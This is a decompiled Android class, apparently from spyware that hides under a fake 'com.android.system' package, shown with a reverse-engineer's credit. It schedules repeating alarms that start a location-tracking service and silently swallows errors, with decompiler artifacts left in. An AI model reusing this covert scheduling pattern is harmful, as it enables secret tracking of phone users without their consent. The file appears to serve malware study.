package com.android.system;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.SystemClock;
import com.security.ServiceSettings;
import com.security.d.a;
import com.security.d.b;

public class LocationReceiver
  extends BroadcastReceiver
{
  static int a(Context paramContext)
  {
    return (int)paramContext.getSharedPreferences("pref", 0).getLong("gps-interval", 60L);
  }
  
  public static void b(Context paramContext)
  {
    a.d("LocationReceiver", "LocationReceiver: scheduleAlarms", new Object[0]);
    int i = a(paramContext);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime() + i * 1000, PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, LocationReceiver.class), 0));
  }
  
  public static void c(Context paramContext)
  {
    a.d("LocationReceiver", "LocationReceiver: scheduleFirstAlarms", new Object[0]);
    ((AlarmManager)paramContext.getSystemService("alarm")).set(2, SystemClock.elapsedRealtime(), PendingIntent.getBroadcast(paramContext, 0, new Intent(paramContext, LocationReceiver.class), 0));
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    try
    {
      if (ServiceSettings.a().gpsAndCellsActive)
      {
        paramIntent = new android/content/Intent;
        paramIntent.<init>(paramContext, LocationService.class);
        paramContext.startService(paramIntent);
      }
      else
      {
        b.a("LocationReceiver", "Servizio Positiong non avviato - Servizio non attivo", getClass().getSimpleName());
      }
      b(paramContext);
      return;
    }
    catch (Exception paramContext)
    {
      for (;;) {}
    }
  }
}


/* Location:              ~/com/android/system/LocationReceiver.class
 *
 * Reversed by:           J
 */